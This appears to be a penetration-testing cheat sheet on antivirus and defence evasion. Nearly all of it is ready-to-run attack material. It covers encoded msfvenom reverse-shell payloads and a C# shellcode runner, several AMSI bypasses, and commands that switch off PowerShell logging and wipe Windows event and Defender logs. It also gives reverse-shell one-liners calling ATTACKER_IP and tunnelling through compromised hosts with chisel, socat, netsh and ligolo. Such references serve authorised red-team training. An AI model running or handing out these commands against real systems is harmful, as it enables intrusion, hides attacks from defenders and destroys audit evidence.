---
icon: file-shield
---

# AV & Defense Evasion

### AV Evasion Techniques

#### Payload Encoding & Obfuscation

```bash
# msfvenom with encoding
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe -o shell.exe

# Multiple encoders
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 -e x86/countdown -f exe -o shell.exe

# Custom template
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 \
  -x /path/to/legit.exe -f exe -o shell.exe
```

#### Shellcode Runners

```csharp
// C# shellcode runner (compiles to PE, loads shellcode at runtime)
using System;
using System.Runtime.InteropServices;

class Program {
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    
    static void Main(string[] args) {
        // msfvenom shellcode here
        byte[] buf = new byte[...] { 0xfc, 0x48, ... };
        int size = buf.Length;
        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
        Marshal.Copy(buf, 0, addr, size);
        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
```

#### Veil Framework

```bash
# Install
apt install veil
veil

# Use Evasion
use evasion

# List payloads
list

# Use a payload
use cs/shellcode_inject/virtual

# Set options
set LHOST ATTACKER_IP
set LPORT 4444

# Generate
generate
```

***

### AMSI Bypass

#### PowerShell AMSI Bypass Methods

```powershell
# Method 1: amsiInitFailed reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Method 2: Memory patching
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

# Method 3: COM interface bypass
$a=[Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
```

***

### PowerShell Logging Evasion

#### Disable Module Logging

```powershell
# Disable module logging for current session
$module = Get-Module Microsoft.PowerShell.Utility
$module.LogPipelineExecutionDetails = $false

$snap = Get-PSSnapin Microsoft.PowerShell.Core
$snap.LogPipelineExecutionDetails = $false
```

#### Disable Script Block Logging

```powershell
# Via registry (needs admin)
New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging' -Name 'EnableScriptBlockLogging' -Value 0 -PropertyType DWord -Force

# Disable transcription
New-Item 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -Force
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription' -Name 'EnableTranscripting' -Value 0 -PropertyType DWord -Force
```

***

### Event Log Clearing

#### CMD

```cmd
# Clear all event logs
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"

# Clear specific log
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
```

#### PowerShell

```powershell
# Clear all logs
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }

# Clear specific log
Clear-EventLog -LogName Security
Clear-EventLog -LogName System
Clear-EventLog -LogName Application

# Wipe Windows Defender logs
wevtutil cl "Microsoft-Windows-Windows Defender/Operational"
```

***

### Pivoting & Tunneling

> Pivoting = using a compromised host to reach other network segments Tunneling = encapsulating traffic through another protocol

For more Detailed notes u can check this : [pivoting](../../pivoting/ "mention")

#### SSH Tunneling

```bash
# Local port forwarding
# Forward local port 8080 to target's port 80 through SSH
ssh -L 8080:TARGET_IP:80 user@SSH_PIVOT

# Access the internal web server via localhost
curl http://127.0.0.1:8080

# Remote port forwarding
# Make your attacker port 4444 accessible on pivot as 4444
ssh -R 4444:127.0.0.1:4444 user@SSH_PIVOT

# Dynamic SOCKS proxy (forward through pivot)
ssh -D 9050 user@SSH_PIVOT
# Then use proxychains
proxychains nmap -sT -p 80,443,22 INTERNAL_IP

# Reverse SSH tunnel from Windows (plink.exe)
plink.exe -ssh -l kali -pw password -R 3306:127.0.0.1:3306 ATTACKER_IP
```

#### Chisel [chisel.md](../../pivoting/chisel.md "mention")

```bash
# Server side (attacker machine)
./chisel server -p 8080 --reverse

# Client side (pivot/compromised machine)
./chisel client ATTACKER_IP:8080 R:1080:socks

# Use with proxychains
# Add to /etc/proxychains.conf:
socks5 127.0.0.1 1080

# Now pivot through the compromised machine
proxychains nmap -sT -p 80 INTERNAL_IP

# Single port forward (not SOCKS)
# Client:
./chisel client ATTACKER_IP:8080 R:8888:INTERNAL_IP:80
# Attacker accesses: http://127.0.0.1:8888
```

#### Socat

```bash
# TCP relay — forward port 80 traffic to internal machine
socat TCP-LISTEN:80,fork TCP:INTERNAL_IP:80 &

# Reverse shell relay through pivot
# On pivot machine:
socat TCP-LISTEN:4444,fork TCP:ATTACKER_IP:4444 &
# On target:
bash -i >& /dev/tcp/PIVOT_IP/4444 0>&1

# Encrypted tunnel with openssl
# Generate certificates on attacker
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 1000 -out bind.crt
cat bind.key bind.crt > bind.pem
# Listener (attacker)
socat OPENSSL-LISTEN:4444,cert=bind.pem,verify=0 -
# Client (pivot/target)
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash
```

#### NetSH (Windows Pivoting)

```cmd
# Requirements:
# - Admin or SYSTEM on Windows machine
# - IP Helper service running
# - IPv6 enabled

# Port forwarding (pivot Windows 10 to Windows Server)
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=PIVOT_IP connectport=445 connectaddress=TARGET_IP

# Allow inbound on the listen port
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=PIVOT_IP localport=4455 action=allow

# Verify
netsh interface portproxy show all

# Remove rule
netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=PIVOT_IP
```

#### Meterpreter Routing

```bash
# Background session
background

# Add route through session
route add INTERNAL_SUBNET/24 SESSION_ID
# Example:
route add 192.168.1.0/24 1

# Or use post module
use post/multi/manage/autoroute
set SESSION 1
run

# SOCKS proxy through Metasploit
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 5
run -j

# Then use proxychains
proxychains nmap -sT -p 80 192.168.1.100
```

#### Ligolo-ng (Modern Pivoting Tool)

```bash
# On attacker — start proxy server
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot machine — run agent
./agent -connect ATTACKER_IP:11601 -ignore-cert

# On attacker Ligolo console — create tunnel
>> session
>> start
>> tunnel_start --tun ligolo

# Add route
sudo ip route add 192.168.1.0/24 dev ligolo

# Now access internal network directly from attacker
nmap -sT -p 80 192.168.1.100
```

